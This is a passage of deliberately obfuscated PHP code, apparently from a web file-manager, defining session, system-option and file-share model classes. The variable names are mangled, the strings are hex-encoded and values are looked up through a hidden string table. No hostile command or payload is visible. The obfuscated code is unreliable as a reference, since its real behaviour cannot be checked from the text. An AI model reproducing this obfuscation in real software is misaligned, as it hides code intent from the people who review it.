$áïê¦Ç· = $this->findByKey($¿­µ¢á[2655], $‹‹Ş¨¨Æ[$¿­µ¢á[487]]); if ($áïê¦Ç·) { return !0; } $ Äâ£…œ = array($¿­µ¢á[2655] => $‹‹Ş¨¨Æ[$¿­µ¢á[487]], $¿­µ¢á[32] => $‹‹Ş¨¨Æ[$¿­µ¢á[32]], $¿­µ¢á[204] => $‹‹Ş¨¨Æ[$¿­µ¢á[204]], $¿­µ¢á[33] => isset($‹‹Ş¨¨Æ[$¿­µ¢á[33]]) ? $‹‹Ş¨¨Æ[$¿­µ¢á[33]] : 1, $¿­µ¢á[2656] => isset($‹‹Ş¨¨Æ[$¿­µ¢á[2656]]) ? $‹‹Ş¨¨Æ[$¿­µ¢á[2656]] : 0, $¿­µ¢á[859] => 0, $¿­µ¢á[226] => 0); return parent::insert($ Äâ£…œ); } public function userNoticeEdit($Øì×éÜÕ, $ŞËî³Ö‹) { $this->initUserOption(); return parent::update($Øì×éÜÕ, $ŞËî³Ö‹); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\x74\145\x6d\137\157\x70\x74\151\157\x6e"; protected $jsonField = array("\x6d\x65\x6e\165", "\x72\x6f\x6c\x65", "\162\157\x6c\x65\x47\162\157\x75\160", "\162\x65\147\151\x73\x74", "\145\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($‹ÌÈ¶Á’) { return "\x53\x79\163\164\145\155\117\160\164\151\x6f\x6e\x5f{$‹ÌÈ¶Á’}"; } protected function optionDefault($ÂùóÑ‹  = '') { $€Â‡ã­ò =& $_SERVER[œ—üé‹ê]; if ($ÂùóÑ‹  == $€Â‡ã­ò[12]) { return $GLOBALS[$€Â‡ã­ò[6]][$€Â‡ã­ò[468]]; } } } class SystemRecordModel extends ModelBaseLight { } goto B„ïÛñÒô; e±ÅÍÒº÷Ğ: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\x6d\137\163\145\x73\163\x69\x6f\156"; public function get($ƒĞÜ÷š¯) { $ÕœûğÇÅ =& $_SERVER[œ—üé‹ê]; $Œó«Ïşı = $this->where(array($ÕœûğÇÅ[2315] => $ƒĞÜ÷š¯))->find(); if (!is_array($Œó«Ïşı)) { return !1; } return $Œó«Ïşı[$ÕœûğÇÅ[168]]; } public function set($åôó©ğÂ, $µ˜ø«ı´, $ïÕ‡ö¦€ = 3600) { $Éå ­âà =& $_SERVER[œ—üé‹ê]; $«®’Ïßµ = array($Éå ­âà[2315] => $åôó©ğÂ, $Éå ­âà[2218] => $µ˜ø«ı´, $Éå ­âà[2316] => $ïÕ‡ö¦€ + time()); if (Session::get($Éå ­âà[2317])) { $«®’Ïßµ[$Éå ­âà[1589]] = Session::get($Éå ­âà[2317]); } else { $«®’Ïßµ[$Éå ­âà[1589]] = 0; } if ($this->get($åôó©ğÂ)) { return $this->where(array($Éå ­âà[2315] => $åôó©ğÂ))->save($«®’Ïßµ); } else { return $this->add($«®’Ïßµ, array(), !0); } } public function remove($µšşß¢Ú) { return $this->where(array($_SERVER[œ—üé‹ê][2315] => $µšşß¢Ú))->delete(); } public function clearTimeout() { return $this->where($_SERVER[œ—üé‹ê][2318] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\x65"; protected $dataAuto = array(array("\155\157\144\151\146\x79\x54\151\155\145", "\164\151\x6d\x65", "\151\x6e\163\x65\x72\x74\x2c\165\160\144\x61\x74\145", "\x66\165\x6e\143\164\x69\x6f\x6e"), array("\143\x72\x65\141\164\145\x54\151\x6d\x65", "\164\151\x6d\x65", "\151\x6e\x73\145\162\164", "\146\165\156\x63\x74\x69\157\156"), array("\157\x70\x74\x69\157\x6e\x73", '', "\151\156\x73\145\x72\164\x2c\x75\160\x64\141\164\x65\54\x73\x65\x6c\x65\x63\x74", "\152\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($ÑúÆäÍ¨) { $°¾éŸ¾ =& $_SERVER[œ—üé‹ê]; return array($°¾éŸ¾[2319] => array(USER_ID, $°¾éŸ¾[2320]), $°¾éŸ¾[2321] => array($ÑúÆäÍ¨[0], $°¾éŸ¾[2322])); } protected function ___listSimple() { $íü²è = $this->field($this->fieldList)->where(array($_SERVER[œ—üé‹ê][1589] => USER_ID))->select(); return $íü²è ? $íü²è : array(); } protected function ___getInfoShare($Û€”­Õö) { return $this->_getShareInfo(array($_SERVER[œ—üé‹ê][687] => $Û€”­Õö), !1); } protected function getInfo($¨ˆ…‹†Ä) { $·ÔÄÍ‘ = $this->getInfoShare($¨ˆ…‹†Ä); return $this->shareSourceInfo($·ÔÄÍ‘); } public function getInfoByHash($–òıÄÃ) { return $this->_getShareInfo(array($_SERVER[œ—üé‹ê][1551] => $–òıÄÃ)); } public function getInfoByPath($¡æµÊĞĞ) { $æƒªËÓ° =& $_SERVER[œ—üé‹ê]; $ı’Åí = array($æƒªËÓ°[1589] => USER_ID, $æƒªËÓ°[191] => $¡æµÊĞĞ); return $this->_getShareInfo($ı’Åí); } public function getInfoBySourcePath($•ÂàŠÈç) { $›¼û…ñ =& $_SERVER[œ—üé‹ê]; $¦åĞÑ‹¹ = array($›¼û…ñ[1589] => USER_ID, $›¼û…ñ[583] => $•ÂàŠÈç); return $this->_getShareInfo($¦åĞÑ‹¹); } private function _getShareInfo($‡ğãùå», $º³†ÕŠ† = true) { $øÁ†½úß =& $_SERVER[œ—üé‹ê]; $¤ôùôŒÛ = $this->where($‡ğãùå»)->find(); if (!$¤ôùôŒÛ) { return !1; } if (!is_array($¤ôùôŒÛ[$øÁ†½úß[580]])) { $¤ôùôŒÛ[$øÁ†½úß[580]] = array(); } $‡ğãùå» = array($øÁ†½úß[687] => $¤ôùôŒÛ[$øÁ†½úß[687]]); $´Ææêİ¹ = $øÁ†½úß[2323]; $¤ôùôŒÛ[$øÁ†½úß[1547]] = Model($øÁ†½úß[688])->order($øÁ†½úß[487])->field($´Ææêİ¹)->where($‡ğãùå»)->select(); if (!$º³†ÕŠ†) { return $¤ôùôŒÛ; } return $this->shareSourceInfo($¤ôùôŒÛ); } private function shareSourceInfo($¿­ìë) { $Ôú•¬ÃÚ =& $_SERVER[œ—üé‹ê]; if (!is_array($¿­ìë)) { return $¿­ìë; } if ($¿­ìë[$Ôú•¬ÃÚ[191]] == $Ôú•¬ÃÚ[228]) { $¿­ìë[$Ôú•¬ÃÚ[90]] = IO::info($¿­ìë[$Ôú•¬ÃÚ[583]]); } else { $¿­ìë[$Ôú•¬ÃÚ[90]] = Model($Ôú•¬ÃÚ[1530])->pathInfo($¿­ìë[$Ôú•¬ÃÚ[191]]); } return $¿­ìë; } protected function getInfoAuth($¬¡ğà÷) { $îàÚñİ =& $_SERVER[œ—üé‹ê]; $ÖÉ“ºéÇ = $this->getInfo($¬¡ğà÷); if ($ÖÉ“ºéÇ[$îàÚñİ[1589]] == USER_ID) { $ÖÉ“ºéÇ[$îàÚñİ[502]] = $ÖÉ“ºéÇ[$îàÚñİ[90]][$îàÚñİ[502]]; } else { $ÖÉ“ºéÇ[$îàÚñİ[502]] = Model($îàÚñİ[587])->authMake($ÖÉ“ºéÇ[$îàÚñİ[1547]]); } return $ÖÉ“ºéÇ; } protected function listData($¯†¾–»æ = null, $ ŞÄ…ç€ = 300) { $’¦·ø£ğ =& $_SERVER[œ—üé‹ê]; $øóğÓÂ¡ = array(array($’¦·ø£ğ[578] => array($’¦·ø£ğ[1179], 0), $’¦·ø£ğ[685] => array($’¦·ø£ğ[1179], 0), $’¦·ø£ğ[2324] => $’¦·ø£ğ[2280])); if ($¯†¾–»æ == $’¦·ø£ğ[2325]) { $øóğÓÂ¡ = array($’¦·ø£ğ[578] => 1); } else { if ($¯†¾–»æ == $’¦·ø£ğ[1343]) { $øóğÓÂ¡ = array($’¦·ø£ğ[685] => 1); } } $øóğÓÂ¡[$’¦·ø£ğ[1589]] = USER_ID; $ŒºŒæÂã = $this->where($øóğÓÂ¡)->selectPage($ ŞÄ…ç€); return $ŒºŒæÂã; } protected function listToMe($‡¹®· = 300) { $¨ğÈÙ…ô =& $_SERVER[œ—üé‹ê]; $ÈäÖ¤ªó = Model($¨ğÈÙ…ô[2326])->userGroupParents(USER_ID); $†Ä•ì½ = array($¨ğÈÙ…ô[670] => SourceModel::TYPE_USER, $¨ğÈÙ…ô[589] => USER_ID); if ($ÈäÖ¤ªó) { $†Ä•ì½ = array(array($¨ğÈÙ…ô[670] => SourceModel::TYPE_USER, $¨ğÈÙ…ô[589] => USER_ID), array($¨ğÈÙ…ô[670] => SourceModel::TYPE_GROUP, $¨ğÈÙ…ô[589] => array($¨ğÈÙ…ô[7], $ÈäÖ¤ªó)), $¨ğÈÙ…ô[2324] => $¨ğÈÙ…ô[2280]); } $ÂÃµÌ¶Ï = Model($¨ğÈÙ…ô[688])->field($¨ğÈÙ…ô[687])->where($†Ä•ì½)->select(); $ÂÃµÌ¶Ï = array_unique(array_to_keyvalue($ÂÃµÌ¶Ï, $¨ğÈÙ…ô[12], $¨ğÈÙ…ô[687])); $†Ä•ì½ = array($¨ğÈÙ…ô[687] => array($¨ğÈÙ…ô[507], $ÂÃµÌ¶Ï)); if (!$ÂÃµÌ¶Ï) { return array($¨ğÈÙ…ô[446] => array(), $¨ğÈÙ…ô[443] => array($¨ğÈÙ…ô[2327] => 0, $¨ğÈÙ…ô[428] => 1)); } $ÑÁÓåÀ£ = Model($¨ğÈÙ…ô[688])->where($†Ä•ì½)->select(); $ÑÁÓåÀ£ = array_to_keyvalue_group($ÑÁÓåÀ£, $¨ğÈÙ…ô[687]); $›µüÏ—Å = $¨ğÈÙ…ô[2328]; $ë·Ã¨ıã = $this->field($›µüÏ—Å)->where($†Ä•ì½)->selectPage($‡¹®·); foreach ($ë·Ã¨ıã[$¨ğÈÙ…ô[446]] as $ŒØœ¸ÒÁ => &$ÕÕ˜âĞ) { $ÕÕ˜âĞ[$¨ğÈÙ…ô[1547]] = $ÑÁÓåÀ£[$ÕÕ˜âĞ[$¨ğÈÙ…ô[687]]]; } unset($ÕÕ˜âĞ); return $ë·Ã¨ıã; } protected function shareAdd($ÑÏÇ«Å, $ã™İà©Œ) { $ÜÏÁ£î =& $_SERVER[œ—üé‹ê]; $è¦…Û¬Ã = $this->_addShareData($ÑÏÇ«Å, $ã™İà©Œ); if (!empty($ã™İà©Œ[$ÜÏÁ£î[2329]])) { $this->_shareAuthSet($è¦…Û¬Ã, $ã™İà©Œ[$ÜÏÁ£î[2329]]); } $this->shareEventAdd($ÑÏÇ«Å, $ã™İà©Œ, $ÜÏÁ£î[2330]); return $è¦…Û¬Ã; } protected function shareAddSystem($úÃã±‚Â, $§‚ó¹Äí) { $ó¶ÌÀÂ =& $_SERVER[œ—üé‹ê]; $Ú”ãŸ¯º = $this->_addShareData($úÃã±‚Â, $§‚ó¹Äí, $ó¶ÌÀÂ[189]); $this->_shareAuthSet($Ú”ãŸ¯º, $§‚ó¹Äí[$ó¶ÌÀÂ[2329]]); return $Ú”ãŸ¯º; } private function shareEventAdd($ÂÂÉª¬¾, $Ø³Çà¶, $Â­Óß¬Ô = "\141\x64\x64") { $øîÍ’›Õ =& $_SERVER[œ—üé‹ê]; if (!$ÂÂÉª¬¾ || $ÂÂÉª¬¾ == $øîÍ’›Õ[228]) { return; } if ($Â­Óß¬Ô == $øîÍ’›Õ[2330]) { if ($Ø³Çà¶[$øîÍ’›Õ[578]] == $øîÍ’›Õ[91]) { Model($øîÍ’›Õ[655])->eventShare($ÂÂÉª¬¾, $øîÍ’›Õ[2331]); } if ($Ø³Çà¶[$øîÍ’›Õ[685]] == $øîÍ’›Õ[91]) { Model($øîÍ’›Õ[655])->eventShare($ÂÂÉª¬¾, $øîÍ’›Õ[2332]); } return; } $Ô²ïÓæ = $this->getInfoByPath($ÂÂÉª¬¾); $áôŞàŠë = $øîÍ’›Õ[2333]; if ($Ô²ïÓæ[$øîÍ’›Õ[578]] == $øîÍ’›Õ[228] && $Ø³Çà¶[$øîÍ’›Õ[578]] == $øîÍ’›Õ[91]) { $áôŞàŠë = $øîÍ’›Õ[2331]; } if ($Ô²ïÓæ[$øîÍ’›Õ[578]] == $øîÍ’›Õ[91] && $Ø³Çà¶[$øîÍ’›Õ[578]] == $øîÍ’›Õ[228]) { $áôŞàŠë = $øîÍ’›Õ[2334]; } if ($Ô²ïÓæ[$øîÍ’›Õ[685]] == $øîÍ’›Õ[228] && $Ø³Çà¶[$øîÍ’›Õ[685]] == $øîÍ’›Õ[91]) { $áôŞàŠë = $øîÍ’›Õ[2332]; } if ($Ô²ïÓæ[$øîÍ’›Õ[685]] == $øîÍ’›Õ[91] && $Ø³Çà¶[$øîÍ’›Õ[685]] == $øîÍ’›Õ[228]) { $áôŞàŠë = $øîÍ’›Õ[2335]; } Model($øîÍ’›Õ[655])->eventShare($ÂÂÉª¬¾, $áôŞàŠë); return; } private function _addShareData($à´ÕÁ‘Æ, $»Ë¯íŸ = array(), $®ü”¹Š = false) { $Ã¹à€Êò =& $_SERVER[œ—üé‹ê]; $‹Ô˜â‹ = $®ü”¹Š == $Ã¹à€Êò[189] ? 0 : USER_ID; $«Îì‹Ğµ = array($Ã¹à€Êò[506] => $à´ÕÁ‘Æ, $Ã¹à€Êò[1965] => $‹Ô˜â‹); if ($à´ÕÁ‘Æ == 0) { $«Îì‹Ğµ = array($Ã¹à€Êò[2336] => $»Ë¯íŸ[$Ã¹à€Êò[583]], $Ã¹à€Êò[1965] => $‹Ô˜â‹); } if ($²îÅ§Áµ = $this->where($«Îì‹Ğµ)->find()) { return $²îÅ§Áµ[$Ã¹à€Êò[687]]; } if ($à´ÕÁ‘Æ == 0) { $ª¬ÖÉâ¶ = array($Ã¹à€Êò[32] => get_path_this($»Ë¯íŸ[$Ã¹à€Êò[87]])); } else { $ª¬ÖÉâ¶ = Model($Ã¹à€Êò[942])->sourceInfo($à´ÕÁ‘Æ); if (!$ª¬ÖÉâ¶) { return !1; } } if (!$»Ë¯íŸ[$Ã¹à€Êò[1861]]) { $»Ë¯íŸ[$Ã¹à€Êò[1861]] = $ª¬ÖÉâ¶[$Ã¹à€Êò[32]]; } $Í™»İä = array($Ã¹à€Êò[1965] => $‹Ô˜â‹, $Ã¹à€Êò[506] => $à´ÕÁ‘Æ, $Ã¹à€Êò[1861] => $Ã¹à€Êò[12], $Ã¹à€Êò[578] => 0, $Ã¹à€Êò[685] => 0, $Ã¹à€Êò[583] => $Ã¹à€Êò[12], $Ã¹à€Êò[382] => $Ã¹à€Êò[12], $Ã¹à€Êò[1053] => $Ã¹à€Êò[12], $Ã¹à€Êò[2337] => 0, $Ã¹à€Êò[2338] => 0, $Ã¹à€Êò[871] => 0, $Ã¹à€Êò[580] => $Ã¹à€Êò[12], $Ã¹à€Êò[1551] => $Ã¹à€Êò[12]); $æ˜°¬ë = explode($Ã¹à€Êò[50], $Ã¹à€Êò[2339]); foreach ($æ˜°¬ë as $Ø­£’Æ—) { if (!isset($»Ë¯íŸ[$Ø­£’Æ—])) { continue; } $Í™»İä[$Ø­£’Æ—] = $»Ë¯íŸ[$Ø­£’Æ—]; } $å­“¸ñ¶ = $this->add($Í™»İä); $»ïŸîê÷ = array($Ã¹à€Êò[1551] => short_id($å­“¸ñ¶)); if ($this->where($»ïŸîê÷)->find()) { $»ïŸîê÷[$Ã¹à€Êò[1551]] .= $Ã¹à€Êò[476] . rand_string(2, 3); } $this->where(array($Ã¹à€Êò[2340] => $å­“¸ñ¶))->save($»ïŸîê÷); return $å­“¸ñ¶; } private function _shareAuthSet($ÄÈÅè•¤, $î‹İ²Åí) { $°„˜•Ùº =& $_SERVER[œ—üé‹ê]; if (!is_array($î‹İ²Åí)) { return !1; } $Îı©‡æã = Model($°„˜•Ùº[2289]); $Îı©‡æã->where(array($°„˜•Ùº[687] => $ÄÈÅè•¤))->delete(); $ëıË÷™Å = array(); foreach ($î‹İ²Åí as $ú»–ŒŞ) { $âúÊËàğ = SourceModel::TYPE_USER; if ($ú»–ŒŞ[$°„˜•Ùº[188]] == SourceModel::TYPE_GROUP) { $âúÊËàğ = SourceModel::TYPE_GROUP; } $Ûµ°Ö¥î = array($°„˜•Ùº[687] => $ÄÈÅè•¤, $°„˜•Ùº[188] => $âúÊËàğ, $°„˜•Ùº[589] => intval($ú»–ŒŞ[$°„˜•Ùº[589]]), $°„˜•Ùº[1637] => 0, $°„˜•Ùº[2341] => -1); if ($ú»–ŒŞ[$°„˜•Ùº[1637]]) { $Ûµ°Ö¥î[$°„˜•Ùº[1637]] = $ú»–ŒŞ[$°„˜•Ùº[1637]]; } else { if ($ú»–ŒŞ[$°„˜•Ùº[2341]]) { $Ûµ°Ö¥î[$°„˜•Ùº[2341]] = $ú»–ŒŞ[$°„˜•Ùº[2341]]; } } $ëıË÷™Å[] = $Ûµ°Ö¥î; } return $Îı©‡æã->addAll($ëıË÷™Å, array(), !0); } public function numViewAdd($‘Œí) { $æèÇ¨à =& $_SERVER[œ—üé‹ê]; $§ó«œÍë = array($æèÇ¨à[2340] => $‘Œí); $this->where($§ó«œÍë)->setAdd($æèÇ¨à[2337]); } public function numDownloadAdd($‚é„Æ‡õ) { $ä¿õ®‡µ =& $_SERVER[œ—üé‹ê]; $ÙöšºÃ = array($ä¿õ®‡µ[2340] => $‚é„Æ‡õ); $this->where($ÙöšºÃ)->setAdd($ä¿õ®‡µ[2338]); } protected function shareEdit($È‹†É—ì, $­Ê÷ØÜì) { $³˜íöëØ =& $_SERVER[œ—üé‹ê]; $ŞİÒõ‡ª = $this->getInfo($È‹†É—ì); if (!$ŞİÒõ‡ª) { return !1; } if ($­Ê÷ØÜì[$³˜íöëØ[1551]] && $­Ê÷ØÜì[$³˜íöëØ[578]] == $³˜íöëØ[91]) { if ($­Ê÷ØÜì[$³˜íöëØ[1551]] == $ŞİÒõ‡ª[$³˜íöëØ[1551]]) { unset($­Ê÷ØÜì[$³˜íöëØ[1551]]); } if ($­Ê÷ØÜì[$³˜íöëØ[1551]]) { $à¸ÒÓãş = $this->where(array($³˜íöëØ[2342] => $­Ê÷ØÜì[$³˜íöëØ[1551]]))->find(); if ($à¸ÒÓãş) { return !1; } if (!is_array($­Ê÷ØÜì[$³˜íöëØ[580]])) { $­Ê÷ØÜì[$³˜íöëØ[580]] = is_array($ŞİÒõ‡ª[$³˜íöëØ[580]]) ? $ŞİÒõ‡ª[$³˜íöëØ[580]] : array(); } if (!$­Ê÷ØÜì[$³˜íöëØ[580]][$³˜íöëØ[2343]]) { $­Ê÷ØÜì[$³˜íöëØ[580]][$³˜íöëØ[2343]] = $ŞİÒõ‡ª[$³˜íöëØ[1551]]; $­Ê÷ØÜì[$³˜íöëØ[580]][$³˜íöëØ[2344]] = $³˜íöëØ[91]; } } } $this->_checkLinkShare($­Ê÷ØÜì, $ŞİÒõ‡ª); $«Ş›–€¢ = array(); $ğøÍÊÉ = explode($³˜íöëØ[50], $³˜íöëØ[2345]); foreach ($ğøÍÊÉ as $¤åğÌ†) { if (!array_key_exists($¤åğÌ†, $­Ê÷ØÜì)) { continue; } $«Ş›–€¢[$¤åğÌ†] = $­Ê÷ØÜì[$¤åğÌ†]; } $this->shareEventAdd($ŞİÒõ‡ª[$³˜íöëØ[191]], $­Ê÷ØÜì, $³˜íöëØ[1558]); $this->where(array($³˜íöëØ[2340] => $È‹†É—ì))->save($«Ş›–€¢); if (isset($­Ê÷ØÜì[$³˜íöëØ[2329]])) { $this->_shareAuthSet($È‹†É—ì, $­Ê÷ØÜì[$³˜íöëØ[2329]]); } return !0; } private function _checkLinkShare($âíñ…î, $§ÈÎı ÷) { $«›¬Ü£ =& $_SERVER[œ—üé‹ê]; if ($âíñ…î[$«›¬Ü£[578]] != $«›¬Ü£[91]) { return; } $ÀâÅÒƒ = $§ÈÎı ÷[$«›¬Ü£[90]][$«›¬Ü£[191]]; if ($§ÈÎı ÷[$«›¬Ü£[90]][$«›¬Ü£[33]] != $«›¬Ü£[230]) { $Ñö„´ûê = $this->_folderReport($ÀâÅÒƒ); if (!$Ñö„´ûê) { return; } show_json(LNG($«›¬Ü£[2346]) . $«›¬Ü£[2347] . $Ñö„´ûê, !1); } $ìùİÀØ = Model($«›¬Ü£[942])->fileInfoGet($§ÈÎı ÷[$«›¬Ü£[90]][$«›¬Ü£[191]]); if (!$ìùİÀØ) { return; } $éªß¿° = $this->shareFileMeta($ìùİÀØ[$«›¬Ü£[557]]); if (isset($éªß¿°[$«›¬Ü£[451]]) && $éªß¿°[$«›¬Ü£[451]] == $«›¬Ü£[91]) { show_json(LNG($«›¬Ü£[2348]), !1); } } private function _folderReport($˜åéØÖË) { $˜Œâƒ„ö =& $_SERVER[œ—üé‹ê]; $®«®Ÿ»‡ = array($˜Œâƒ„ö[557] => array($˜Œâƒ„ö[1179], 0), $˜Œâƒ„ö[859] => 3); $ÚË´ªá = Model($˜Œâƒ„ö[2349])->where($®«®Ÿ»‡)->field($˜Œâƒ„ö[557])->select(); if (!$ÚË´ªá) { return !1; } $ÚË´ªá = array_to_keyvalue($ÚË´ªá, $˜Œâƒ„ö[12], $˜Œâƒ„ö[557]); $õ†Á¦ú = $˜Œâƒ„ö[50] . $˜åéØÖË . $˜Œâƒ„ö[50]; $®«®Ÿ»‡ = array($˜Œâƒ„ö[557] => array($˜Œâƒ„ö[7], $ÚË´ªá), $˜Œâƒ„ö[604] => array($˜Œâƒ„ö[473], "\x25{$õ†Á¦ú}\x25"), $˜Œâƒ„ö[520] => 0); $£„ÖÍÃ‘ = Model($˜Œâƒ„ö[942])->where($®«®Ÿ»‡)->field($˜Œâƒ„ö[2350])->find(); if (!$£„ÖÍÃ‘) { return !1; } $ò©ô«˜… = substr($£„ÖÍÃ‘[$˜Œâƒ„ö[604]], strpos($£„ÖÍÃ‘[$˜Œâƒ„ö[604]], $õ†Á¦ú)); $®«®Ÿ»‡ = array($˜Œâƒ„ö[191] => array($˜Œâƒ„ö[7], trim($ò©ô«˜…, $˜Œâƒ„ö[50]))); $úËˆµûÏ = Model($˜Œâƒ„ö[942])->where($®«®Ÿ»‡)->field($˜Œâƒ„ö[32])->select(); $òÄÃĞ• = array_to_keyvalue($úËˆµûÏ, $˜Œâƒ„ö[12], $˜Œâƒ„ö[32]); $òÄÃĞ•[] = $£„ÖÍÃ‘[$˜Œâƒ„ö[32]]; return implode($˜Œâƒ„ö[8], $òÄÃĞ•); } protected function remove($·Ìà´õ) { $©æº¤„¾ =& $_SERVER[œ—üé‹ê]; $¿Šİ”ˆ‰ = is_array($·Ìà´õ) ? $·Ìà´õ : array($·Ìà´õ); for ($¿†İí•Á = 0; $¿†İí•Á < count($¿Šİ”ˆ‰); $¿†İí•Á++) { $üÑ¥óÏ = $this->getInfo($¿Šİ”ˆ‰[$¿†İí•Á]); if ($üÑ¥óÏ[$©æº¤„¾[685]] == $©æº¤„¾[91]) { Model($©æº¤„¾[655])->eventShare($üÑ¥óÏ[$©æº¤„¾[191]], $©æº¤„¾[2335]); } if ($üÑ¥óÏ[$©æº¤„¾[578]] == $©æº¤„¾[91]) { Model($©æº¤„¾[655])->eventShare($üÑ¥óÏ[$©æº¤„¾[191]], $©æº¤„¾[2334]); } } $ú¤â¤ìá = array($©æº¤„¾[687] => array($©æº¤„¾[7], $¿Šİ”ˆ‰)); $ÃĞ…Ìõ„ = $this->where($ú¤â¤ìá)->delete(); if ($ÃĞ…Ìõ„) { Model($©æº¤„¾[688])->where($ú¤â¤ìá)->delete(); } return $ÃĞ…Ìõ„; } protected function removeBySource($÷á”Áä÷) { $Å¢áîÌ¡ =& $_SERVER[œ—üé‹ê]; $æÉùìÂÅ = array($Å¢áîÌ¡[506] => array($Å¢áîÌ¡[507], $÷á”Áä÷)); $¨éÎÆßë = $this->field($Å¢áîÌ¡[687])->where($æÉùìÂÅ)->select(); $óÌÎÑ²ı = array_to_keyvalue($¨éÎÆßë, $Å¢áîÌ¡[12], $Å¢áîÌ¡[687]); if (!$óÌÎÑ²ı) { return; } foreach ($¨éÎÆßë as $Ö’¨ëäì) { $this->cacheFunctionClear($Å¢áîÌ¡[2351], $Ö’¨ëäì[$Å¢áîÌ¡[687]]); } $æÉùìÂÅ = array($Å¢áîÌ¡[2340] => array($Å¢áîÌ¡[507], $óÌÎÑ²ı)); $this->where($æÉùìÂÅ)->delete(); Model($Å¢áîÌ¡[688])->where($æÉùìÂÅ)->delete(); } public function listAll($çÎõ©¥¶) { $¯ÚşïëÖ =& $_SERVER[œ—üé‹ê]; $ùˆ¶†´ = array(); if ($çÎõ©¥¶[$¯ÚşïëÖ[1589]]) { $ùˆ¶†´[$¯ÚşïëÖ[1589]] = $çÎõ©¥¶[$¯ÚşïëÖ[1589]]; } if ($çÎõ©¥¶[$¯ÚşïëÖ[870]]) { $¨’†Ï÷ = $çÎõ©¥¶[$¯ÚşïëÖ[871]] ? $çÎõ©¥¶[$¯ÚşïëÖ[871]] : strtotime(date($¯ÚşïëÖ[2352])); $ùˆ¶†´[$¯ÚşïëÖ[231]] = array($¯ÚşïëÖ[408], array($çÎõ©¥¶[$¯ÚşïëÖ[870]], $¨’†Ï÷)); } if ($çÎõ©¥¶[$¯ÚşïëÖ[33]]) { $ùˆ¶†´[$çÎõ©¥¶[$¯ÚşïëÖ[33]]] = 1; } else { $ùˆ¶†´[] = array($¯ÚşïëÖ[578] => array($¯ÚşïëÖ[1179], 0), $¯ÚşïëÖ[685] => array($¯ÚşïëÖ[1179], 0), $¯ÚşïëÖ[2324] => $¯ÚşïëÖ[2280]); } if ($çÎõ©¥¶[$¯ÚşïëÖ[2276]]) { $ùˆ¶†´[] = array($¯ÚşïëÖ[1551] => $çÎõ©¥¶[$¯ÚşïëÖ[2276]], $¯ÚşïëÖ[1861] => array($¯ÚşïëÖ[473], "\x25{$çÎõ©¥¶[$¯ÚşïëÖ[2276]]}\x25"), $¯ÚşïëÖ[2324] => $¯ÚşïëÖ[2280]); } $ô„±ì¸— = $this->_makeOrder()->where($ùˆ¶†´)->selectPage(20); if (empty($ô„±ì¸—[$¯ÚşïëÖ[446]])) { return array(); } $this->_listDataApply($ô„±ì¸—[$¯ÚşïëÖ[446]]); return $ô„±ì¸—; } public function listDataApply($°¼õ“ºª) { $this->_listDataApply($°¼õ“ºª); return $°¼õ“ºª; } private function _listDataApply(&$œÄİÊßç) { $æº­Ó‰€ =& $_SERVER[œ—üé‹ê]; $§óÛÕõŠ = array_to_keyvalue($œÄİÊßç, $æº­Ó‰€[12], $æº­Ó‰€[1589]); $¾™î¾” = Model($æº­Ó‰€[617])->userListInfo(array_unique($§óÛÕõŠ)); $öı‹Ç¶÷ = array_to_keyvalue($œÄİÊßç, $æº­Ó‰€[12], $æº­Ó‰€[191]); $Ëëíæô = Model($æº­Ó‰€[942])->sourceListInfo($öı‹Ç¶÷, !0); foreach ($œÄİÊßç as $…´´‚«‰ => &$íŠ¢’¾) { $²ÓñÈ÷ = $íŠ¢’¾[$æº­Ó‰€[1589]]; $íŠ¢’¾[$æº­Ó‰€[2353]] = $¾™î¾”[$²ÓñÈ÷] ? $¾™î¾”[$²ÓñÈ÷] : !1; if (!$íŠ¢’¾[$æº­Ó‰€[2353]] || $íŠ¢’¾[$æº­Ó‰€[2353]][$æº­Ó‰€[859]] != $æº­Ó‰€[91]) { unset($œÄİÊßç[$…´´‚«‰]); continue; } $ÕŸîªĞ = $íŠ¢’¾[$æº­Ó‰€[191]]; $íŠ¢’¾[$æº­Ó‰€[90]] = $Ëëíæô[$ÕŸîªĞ] ? $Ëëíæô[$ÕŸîªĞ] : !1; if ($íŠ¢’¾[$æº­Ó‰€[90]][$æº­Ó‰€[520]] == $æº­Ó‰€[91]) { unset($œÄİÊßç[$…´´‚«‰]); } if ($íŠ¢’¾[$æº­Ó‰€[90]] != $æº­Ó‰€[228] && !$íŠ¢’¾[$æº­Ó‰€[90]]) { unset($œÄİÊßç[$…´´‚«‰]); } } unset($íŠ¢’¾); $œÄİÊßç = array_values($œÄİÊßç); } private function _makeOrder($ş›Ë¸‘§ = '') { $†ó°ŠÉá =& $_SERVER[œ—üé‹ê]; $¾­¹àöø = array($†ó°ŠÉá[231], $†ó°ŠÉá[871], $†ó°ŠÉá[2337], $†ó°ŠÉá[2338]); $ÙéÍÁµ = array($†ó°ŠÉá[537] => $†ó°ŠÉá[538], $†ó°ŠÉá[539] => $†ó°ŠÉá[540]); $¸’îï° = Input::get($†ó°ŠÉá[544], $†ó°ŠÉá[7], $†ó°ŠÉá[512], $¾­¹àöø); $­ÏĞ½ë = Input::get($†ó°ŠÉá[545], $†ó°ŠÉá[7], $†ó°ŠÉá[2354], array($†ó°ŠÉá[2273], $†ó°ŠÉá[539])); $­ÏĞ½ë = $ÙéÍÁµ[$­ÏĞ½ë]; $ş›Ë¸‘§ = $ş›Ë¸‘§ . "{$¸’îï°}\40{$­ÏĞ½ë}"; return $this->order($ş›Ë¸‘§); } public function reportAdd($¸Ÿ¨Ãè) { $¥œ¤á¨ =& $_SERVER[œ—üé‹ê]; $Ê‰ô¶È¦ = array($¥œ¤á¨[687] => $¸Ÿ¨Ãè[$¥œ¤á¨[687]], $¥œ¤á¨[1589] => USER_ID); if (Model($¥œ¤á¨[2349])->where($Ê‰ô¶È¦)->find()) { return !1; } $èå–¤³ = array($¥œ¤á¨[687] => $¸Ÿ¨Ãè[$¥œ¤á¨[687]], $¥œ¤á¨[1861] => $¸Ÿ¨Ãè[$¥œ¤á¨[1861]], $¥œ¤á¨[191] => $¸Ÿ¨Ãè[$¥œ¤á¨[191]], $¥œ¤á¨[557] => $¸Ÿ¨Ãè[$¥œ¤á¨[557]], $¥œ¤á¨[1589] => USER_ID, $¥œ¤á¨[33] => $¸Ÿ¨Ãè[$¥œ¤á¨[33]], 